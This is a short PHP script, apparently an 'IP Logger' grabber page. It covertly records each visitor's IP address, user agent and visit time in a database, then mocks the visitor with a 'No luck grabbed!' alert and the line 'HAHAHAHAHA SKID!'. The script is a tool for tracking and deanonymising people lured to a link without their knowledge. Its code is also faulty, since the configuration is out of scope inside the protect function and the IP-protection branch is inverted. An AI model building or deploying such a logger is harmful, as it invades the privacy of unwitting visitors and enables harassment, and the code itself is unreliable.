<?php 

ob_start();
$config = include('config.php');
require_once 'skid/db.php';

$user_agent = $_SERVER['HTTP_USER_AGENT'];
$timer = date('d/m/Y h:i:s a', time());

function protect($oof)
{
	foreach ($config->ProtectedIPs as &$toCheck) {
		if($oof == $toCheck){
			die("Protected from this IP Logger");
		}
	}
}

if($config->cloudflare == true){
	$ip = $_SERVER["HTTP_CF_CONNECTING_IP"];
	protect($ip);
} else if($config->ProtectedIPs == false){
	$ip = $_SERVER['REMOTE_ADDR'];
	protect($ip);
}

$DoubleGrabVerif = $odb->prepare("SELECT COUNT(*) FROM `ips` WHERE `ip` = :ip");
$DoubleGrabVerif->execute(array(':ip' => $ip));
$IpAlreadyGrabbed = $DoubleGrabVerif->fetchColumn(0);
if($IpAlreadyGrabbed > 0){$IpAlreadyGrabbedFuck = ':(';die($IpAlreadyGrabbedFuck);}
$ipp = $odb->prepare("INSERT INTO `ips` VALUES(:ip, :UA, :Time)");
$ipp->execute(array(':ip' => $ip, ':UA' => $user_agent, ':Time' => $timer));
$fuckyou = "No luck grabbed!";
?>
<script>
	alert('<?php echo "$fuckyou" ?>')
</script>
HAHAHAHAHA SKID!
